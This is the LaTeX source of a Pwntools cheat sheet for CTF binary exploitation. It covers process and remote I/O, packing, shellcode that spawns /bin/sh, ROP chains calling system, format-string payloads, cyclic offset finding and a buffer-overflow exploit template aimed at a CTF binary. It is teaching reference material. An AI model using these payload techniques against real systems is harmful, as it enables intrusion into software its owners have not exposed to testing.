\documentclass[10pt,landscape,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[landscape]{geometry}
\usepackage{multicol}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{tcolorbox}
\usepackage{enumitem}
\usepackage{fancyhdr}
\usepackage{titlesec}

% Page setup
\geometry{top=0.5cm,left=0.5cm,right=0.5cm,bottom=0.5cm}
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0pt}
\setlength{\parindent}{0pt}
\setlength{\parskip}{0pt}

% Colors
\definecolor{sectioncolor}{RGB}{41,128,185}
\definecolor{codecolor}{RGB}{44,62,80}
\definecolor{examplecolor}{RGB}{52,152,219}
\definecolor{bgcolor}{RGB}{236,240,241}

% Section formatting
\titleformat{\section}{\large\bfseries\color{sectioncolor}}{}{0em}{}[\titlerule]
\titlespacing*{\section}{0pt}{1ex}{0.5ex}

% Code listing style
\lstset{
    basicstyle=\ttfamily\small,
    backgroundcolor=\color{bgcolor},
    frame=single,
    breaklines=true,
    xleftmargin=2pt,
    xrightmargin=2pt,
    aboveskip=2pt,
    belowskip=2pt
}

\begin{document}

\begin{center}
    {\Huge\bfseries\color{sectioncolor} Pwntools Cheat Sheet}\\
    \vspace{0.2cm}
    {\large Python exploitation framework for CTF and binary exploitation}
\end{center}

\begin{multicols}{3}
\setlength{\premulticols}{1pt}
\setlength{\postmulticols}{1pt}
\setlength{\multicolsep}{1pt}
\setlength{\columnsep}{1.5em}

\section*{Basic Setup}
\begin{lstlisting}[language=Python]
from pwn import *

# Context setup
context.arch = 'i386'  # or 'amd64'
context.os = 'linux'
context.log_level = 'debug'  # or 'info'
context.terminal = ['tmux', 'splitw', '-h']
\end{lstlisting}

\section*{Process \& Remote}
\begin{lstlisting}[language=Python]
# Local process
p = process('./binary')
p = process(['./binary', 'arg1'])

# Remote connection
r = remote('host', port)
r = remote('example.com', 1337)

# SSH connection
sh = ssh('user', 'host', password='pass')
p = sh.process('./binary')
\end{lstlisting}

\section*{ELF Operations}
\begin{lstlisting}[language=Python]
# Load binary
elf = ELF('./binary')

# Get symbols
win_addr = elf.symbols['win']
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']

# Get sections
elf.address        # Base address
elf.entry          # Entry point
elf.search(b'/bin/sh')  # Search bytes

# Checksec info
print(elf.checksec())
\end{lstlisting}

\section*{Sending Data}
\begin{lstlisting}[language=Python]
# Send functions
p.send(b'data')
p.sendline(b'data')      # + newline
p.sendafter(b'prompt', b'data')
p.sendlineafter(b'>', b'data')

# Interactive shell
p.interactive()

# Close connection
p.close()
\end{lstlisting}

\section*{Receiving Data}
\begin{lstlisting}[language=Python]
# Receive functions
data = p.recv(1024)      # Receive N bytes
data = p.recvline()      # Until newline
data = p.recvuntil(b':') # Until pattern
data = p.recvall()       # All until EOF
data = p.recvrepeat(1)   # Recv with timeout

# Clean output
data = p.recvline().strip()
data = p.clean()         # Remove ANSI

# Decode
text = p.recvline().decode()
\end{lstlisting}

\section*{Packing \& Unpacking}
\begin{lstlisting}[language=Python]
# Pack integers (endianness from context)
p32(0xdeadbeef)  # 4 bytes (32-bit)
p64(0xdeadbeef)  # 8 bytes (64-bit)
p16(0x1234)      # 2 bytes
p8(0x41)         # 1 byte

# Unpack
u32(b'\xef\xbe\xad\xde')  # -> int
u64(data)
u16(data)
u8(data)

# Manual endianness
p32(addr, endian='big')
u64(data, sign='signed')
\end{lstlisting}

\section*{Shellcode}
\begin{lstlisting}[language=Python]
# Generate shellcode
shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.i386.linux.sh())
shellcode = asm(shellcraft.amd64.linux.sh())

# Execute command
sc = shellcraft.execve('/bin/sh', 0, 0)
sc = shellcraft.cat('flag.txt')

# Assemble
code = asm('nop; ret')
code = asm('xor eax, eax; ret')

# Disassemble
disasm(b'\x90\xc3')
\end{lstlisting}

\section*{ROP (Return Oriented Programming)}
\begin{lstlisting}[language=Python]
# Find ROP gadgets
rop = ROP(elf)
rop = ROP('./binary')

# Build chain
rop.call('system', ['/bin/sh'])
rop.raw(0x41414141)  # Add raw value
rop.ret()            # Add ret gadget

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
rop.rdi = 0xdeadbeef  # Set register

# Generate payload
payload = rop.chain()
print(rop.dump())    # Show ROP chain
\end{lstlisting}

\section*{Format String}
\begin{lstlisting}[language=Python]
# Format string payload
fmtstr_payload(offset, {addr: value})
fmtstr_payload(6, {elf.got['printf']: 
                    elf.symbols['win']})

# Utilities
p.sendline(b'AAAA' + b'%p.'*20)
# Parse output to find offset
\end{lstlisting}

\section*{Cyclic Patterns}
\begin{lstlisting}[language=Python]
# Generate cyclic pattern
pattern = cyclic(200)
pattern = cyclic(100, n=8)  # 8-byte chunks

# Find offset
offset = cyclic_find(0x6161616b)
offset = cyclic_find(b'kaaa')
offset = cyclic_find(p32(0x6161616b))

# In exploit
p.sendline(cyclic(200))
# Crash, get EIP/RIP, then:
offset = cyclic_find(eip_value)
\end{lstlisting}

\section*{Logging}
\begin{lstlisting}[language=Python]
# Log functions
log.info('Message')
log.success('Win!')
log.warn('Warning')
log.error('Error')
log.debug('Debug info')

# Progress
p = log.progress('Leaking')
p.status('0x%x' % addr)
p.success('Done!')
\end{lstlisting}

\section*{Utils}
\begin{lstlisting}[language=Python]
# Hexdump
print(hexdump(data))

# Flat payload builder
payload = flat(
    b'A' * 40,
    p32(0xdeadbeef),
    p32(elf.symbols['win']),
    b'\x00' * 4
)

# XOR
xor(b'data', 0x42)
xor(b'hello', b'key')

# Pause for debugging
pause()

# Sleep
sleep(1)
\end{lstlisting}

\section*{GDB Integration}
\begin{lstlisting}[language=Python]
# Attach GDB
gdb.attach(p, '''
    break *main
    continue
''')

# Debug with commands
p = gdb.debug('./binary', '''
    break vuln
    continue
''')

# Attach and interact
gdb.attach(p)
p.interactive()
\end{lstlisting}

\section*{Common Exploit Template}
\begin{lstlisting}[language=Python]
#!/usr/bin/env python3
from pwn import *

# Config
elf = ELF('./vuln')
context.binary = elf
context.log_level = 'info'

# Connection
if args.REMOTE:
    p = remote('host', 1337)
else:
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, 'b vuln')

# Find offset (one time)
# p.sendline(cyclic(200))
# offset = cyclic_find(0x6161616b)

# Exploit
offset = 40
payload = flat(
    b'A' * offset,
    p32(elf.symbols['win'])
)

p.recvuntil(b'Input: ')
p.sendline(payload)
p.recvuntil(b'flag{')
flag = b'flag{' + p.recvuntil(b'}')
log.success(f'Flag: {flag.decode()}')

p.interactive()
\end{lstlisting}

\section*{Useful Tips}
\begin{itemize}[leftmargin=*,noitemsep,topsep=0pt]
    \item Use \texttt{args.REMOTE} for remote/local switching
    \item Use \texttt{context.binary = elf} for auto-config
    \item Use \texttt{flat()} for clean payload building
    \item Add \texttt{pause()} before sending exploit to attach debugger
    \item Check \texttt{elf.checksec()} for protections
    \item Use \texttt{hexdump()} to debug payloads
    \item Set \texttt{context.log\_level} to control output
\end{itemize}

\vfill
\columnbreak

\end{multicols}

\end{document}
